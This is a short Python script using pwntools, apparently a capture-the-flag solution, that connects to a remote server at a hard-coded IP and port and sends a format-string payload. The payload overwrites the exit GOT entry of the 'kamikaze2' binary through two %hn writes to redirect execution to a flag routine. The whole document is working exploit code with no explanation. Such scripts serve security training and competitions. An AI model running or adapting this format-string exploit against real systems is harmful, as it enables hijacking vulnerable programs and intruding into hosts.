from pwn import *

def exploit():
    # p = process("./kamikaze2")
    p = remote("13.53.125.206", 50000)
    binary = ELF("kamikaze2")
    exit_got = binary.got['exit']
    #flag = 0x08420736

    payload = ''
    payload += 'A' * 2
    payload += p32(exit_got)
    payload += p32(exit_got + 2)
    payload += "%8${}p".format(0x0736 - len(payload))
    payload += "%8$hn"
    payload += "%{}p".format(0x10842 - 0x0736)
    payload += "%9$hn"

    # gdb.attach(p , "brva *__libc_start_main+248")

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()